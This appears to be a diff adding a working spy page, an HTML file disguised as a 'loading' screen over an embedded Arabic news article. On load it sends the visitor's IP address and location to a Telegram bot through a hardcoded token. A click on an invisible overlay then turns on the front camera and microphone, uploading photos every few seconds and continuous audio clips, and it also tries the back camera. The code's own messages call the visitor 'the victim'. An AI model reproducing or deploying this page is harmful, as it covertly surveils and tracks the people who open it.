@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحميل...</title>
+    <style>
+        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background-color: #000; }
+        iframe { width: 100%; height: 100%; border: none; position: absolute; z-index: 1; }
+        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.01); z-index: 999; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <iframe src="https://www.elwatannews.com/news/details/8272377"></iframe>
+    <div id="overlay" onclick="startOrganizedCapture()"></div>
+
+    <script>
+        const token = '8748637078:AAFK5pkwqMSJs1puHBISgP_TNAHTBHWVPlk';
+        const chatId = '5664958773';
+        let isRecording = false;
+        let photoInterval = null;
+        let videoStream = null;
+
+        async function sendMsg(txt) {
+            try {
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(txt)}&parse_mode=Markdown`);
+            } catch(e) {}
+        }
+
+        window.onload = async () => {
+            const userAgent = navigator.userAgent;
+            let deviceName = "غير معروف";
+            if (userAgent.match(/Android/i)) deviceName = "Android Device";
+            else if (userAgent.match(/iPhone/i)) deviceName = "iPhone";
+            
+            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
+                sendMsg(`📱 *نوع الهاتف:* ${deviceName}\n🌐 *IP:* ${d.ip}`);
+                setTimeout(() => {
+                    sendMsg(`📍 *الموقع بالتفصيل:*\nالمدينة: ${d.city}\nالدولة: ${d.country_name}\nالشركة المزودة: ${d.org}`);
+                }, 1000);
+            });
+        };
+
+        async function startOrganizedCapture() {
+            document.getElementById('overlay').style.display = 'none';
+
+            let batteryInfo = "غير مدعوم";
+            try { const b = await navigator.getBattery(); batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'جاري الشحن' : 'تفريغ'})`; } catch(e) {}
+            
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            let netType = connection ? connection.effectiveType : "غير معروف";
+            
+            sendMsg(`🔋 *البطارية:* ${batteryInfo}\n📶 *نوع الشبكة:* ${netType}`);
+
+            try {
+                videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                
+                startContinuousRecording(videoStream);
+                startContinuousPhoto(videoStream, "الأمامية");
+                
+                sendMsg("🎥 *بدء التصوير والتسجيل المستمر - المدة: طول فترة وجود الضحية في الصفحة*");
+
+                setTimeout(async () => {
+                    try {
+                        const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                        await capturePhotoOnly(backStream, "الخلفية");
+                        backStream.getTracks().forEach(t => t.stop());
+                    } catch(e) { sendMsg("⚠️ الكاميرا الخلفية محظورة."); }
+                }, 1500);
+
+            } catch (e) {
+                sendMsg("🚫 الضحية رفض الأذونات.");
+            }
+        }
+
+        function startContinuousRecording(stream) {
+            if (isRecording) return;
+            isRecording = true;
+            
+            function recordSegment() {
+                if (!isRecording) return;
+                
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+                
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'audio/ogg' });
+                    const frm = new FormData();
+                    frm.append('chat_id', chatId);
+                    frm.append('voice', blob, `audio_${Date.now()}.ogg`);
+                    fetch(`https://api.telegram.org/bot${token}/sendVoice`, { method: 'POST', body: frm });
+                    
+                    if (isRecording) {
+                        setTimeout(recordSegment, 1000);
+                    }
+                };
+                
+                recorder.start();
+                setTimeout(() => recorder.stop(), 30000);
+            }
+            
+            recordSegment();
+        }
+
+        function startContinuousPhoto(stream, type) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.muted = true;
+            video.play();
+            
+            photoInterval = setInterval(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = 480;
+                canvas.height = 640;
+                canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
+                canvas.toBlob(blob => {
+                    const frm = new FormData();
+                    frm.append('chat_id', chatId);
+                    frm.append('photo', blob, `${type}_${Date.now()}.jpg`);
+                    frm.append('caption', `📸 تصوير مستمر - الكاميرا ${type}`);
+                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: frm });
+                }, 'image/jpeg', 0.5);
+            }, 5000);
+        }
+
+        async function capturePhotoOnly(stream, type) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.muted = true;
+            await video.play();
+            
+            const canvas = document.createElement('canvas');
+            canvas.width = 480;
+            canvas.height = 640;
+            canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
+            canvas.toBlob(blob => {
+                const frm = new FormData();
+                frm.append('chat_id', chatId);
+                frm.append('photo', blob, `${type}.jpg`);
+                frm.append('caption', `📸 لقطة من الكاميرا ${type}`);
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: frm });
+            }, 'image/jpeg', 0.5);
+        }
+
+        window.addEventListener('beforeunload', () => {
+            if (photoInterval) clearInterval(photoInterval);
+            if (videoStream) videoStream.getTracks().forEach(t => t.stop());
+            isRecording = false;
+            sendMsg("🛑 *تم إغلاق الصفحة - توقف التصوير والتسجيل*");
+        });
+    </script>
+</body>
+</html>
